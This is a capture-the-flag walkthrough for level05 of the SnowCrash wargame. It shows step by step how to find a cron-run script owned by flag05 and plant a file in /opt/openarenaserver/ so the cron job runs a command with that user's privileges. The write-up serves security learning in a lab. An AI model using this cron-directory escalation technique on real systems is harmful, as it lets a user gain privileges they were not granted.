## 1. Connect to level05:

```bash
level04@SnowCrash:~$ su level05
password: *use previously found flag*
```

## 2. Find all files related to user *`flag05`*:
Starting from the home directory. Put all errors in /dev/null so that they don’t pollute the terminal.
```bash
level05@SnowCrash:~$ find / -user flag05 2> /dev/null
    /usr/sbin/openarenaserver
    /rofs/usr/sbin/openarenaserver
```

```bash
level05@SnowCrash:~$ ls -l /usr/sbin/openarenaserver
	-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver

level05@SnowCrash:~$ ls -l /rofs/usr/sbin/openarenaserver
	-rwxr-x--- 1 flag05 flag05 94 Mar  5  2016 /rofs/usr/sbin/openarenaserver
```

## 3. Read the files for which we have permission:
```bash
level05@SnowCrash:~$ cat /rofs/usr/sbin/openarenaserver
	cat: /rofs/usr/sbin/openarenaserver: Permission denied

level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
```

The function in `/usr/sbin/openarenaserver` goes through all the files and directories in `/opt/openarenaserver/`.
It executes all the `$i` files and deletes them afterwards.

## 4. Add a file in `/opt/openarenaserver/` to be executed:

Note that we cannot execute the existing sript ourselves
```bash
level05@SnowCrash:~$ ./usr/sbin/openarenaserver
	bash: /usr/sbin/openarenaserver: Permission denied
```

Therefore, write the script in a file
```bash
level05@SnowCrash:~$ echo "getflag > /tmp/flag" > /opt/openarenaserver/flag
```

## 5. Wait a couple of minutes for the cron job to execute `/opt/openarenaserver/`, then run:
```bash
level05@SnowCrash:~$ cat /tmp/flag
```